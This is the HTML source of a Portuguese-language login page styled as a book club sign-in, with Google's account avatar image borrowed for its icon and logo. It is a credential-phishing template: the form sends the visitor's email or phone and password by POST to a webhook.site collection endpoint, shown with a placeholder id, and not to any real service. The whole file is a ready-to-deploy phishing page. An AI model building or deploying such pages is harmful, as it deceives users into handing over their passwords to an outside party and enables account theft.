<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Clube de Livros</title>
  <link rel="stylesheet" href="style.css" />
  <link rel="icon" href="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" type="image/png">
</head>
<body>
  <div class="login-container">
    <div class="login-box">
      <img src="https://ssl.gstatic.com/accounts/ui/avatar_2x.png" alt="Avatar" class="avatar">
      <h2>Bem-vindo ao Clube de Livros</h2>
      <form action="https://webhook.site/SEU_WEBHOOK_AQUI" method="POST">
        <input type="email" name="email" placeholder="E-mail ou telefone" required />
        <input type="password" name="senha" placeholder="Senha" required />
        <button type="submit">Entrar</button>
        <div class="footer-link">
          <a href="#">Esqueceu a senha?</a>
        </div>
      </form>
    </div>
  </div>
</body>
</html>
